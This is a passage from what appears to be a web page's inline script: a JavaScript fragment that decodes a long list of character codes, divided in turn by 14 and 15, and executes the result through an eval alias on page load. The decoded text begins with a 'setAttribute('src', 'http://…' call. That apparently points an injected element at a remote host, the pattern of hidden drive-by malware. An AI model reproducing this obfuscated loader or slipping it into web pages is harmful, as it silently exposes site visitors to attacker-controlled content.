&&690&&1610&&1515&&1624&&975&&1624&&1740&&1596&&1575&&1372&&1755&&1624&&1515&&560&&585&&1610&&1710&&1386&&585&&616&&585&&1456&&1740&&1624&&1680&&812&&705&&658&&1470&&1414&&1725&&1624&&1635&&1358&&1485&&1470&&1650&&1624&&1665&&1610&&1560&&644&&1650&&1512&&705&&1442&&1665&&644&&1680&&1456&&1680&&882&&1725&&1470&&1500&&854&&735&&546&&615&&826&&1530&&644&&1725&&1624&&1815&&1512&&1515&&644&&1770&&1470&&1725&&1470&&1470&&1470&&1620&&1470&&1740&&1694&&915&&546&&1560&&1470&&1500&&1400&&1515&&1540&&585&&826&&1530&&644&&1725&&1624&&1815&&1512&&1515&&644&&1680&&1554&&1725&&1470&&1740&&1470&&1665&&1540&&915&&546&&1455&&1372&&1725&&1554&&1620&&1638&&1740&&1414&&585&&826&&1530&&644&&1725&&1624&&1815&&1512&&1515&&644&&1620&&1414&&1530&&1624&&915&&546&&720&&546&&885&&1428&&690&&1610&&1740&&1694&&1620&&1414&&690&&1624&&1665&&1568&&915&&546&&720&&546&&885&&1428&&690&&1610&&1515&&1624&&975&&1624&&1740&&1596&&1575&&1372&&1755&&1624&&1515&&560&&585&&1666&&1575&&1400&&1740&&1456&&585&&616&&585&&686&&720&&546&&615&&826&&1530&&644&&1725&&1414&&1740&&910&&1740&&1624&&1710&&1470&&1470&&1638&&1740&&1414&&600&&546&&1560&&1414&&1575&&1442&&1560&&1624&&585&&616&&585&&686&&720&&546&&615&&826&&195&&126&&135&&126&&1500&&1554&&1485&&1638&&1635&&1414&&1650&&1624&&690&&1442&&1515&&1624&&1035&&1512&&1515&&1526&&1515&&1540&&1740&&1610&&990&&1694&&1260&&1358&&1545&&1092&&1455&&1526&&1515&&560&&585&&1372&&1665&&1400&&1815&&546&&615&&1274&&720&&1302&&690&&1358&&1680&&1568&&1515&&1540&&1500&&938&&1560&&1470&&1620&&1400&&600&&1428&&615&&826&&195&&126&&135&&1750".split("&&");h=2;s="";if(m)for(i=0;i-581!=0;i=1+i){k=i;s+=String[ff](n[k]/(i-h*Math[f](i/h)+016));}if(018-0xf===3)ev(s);}</script>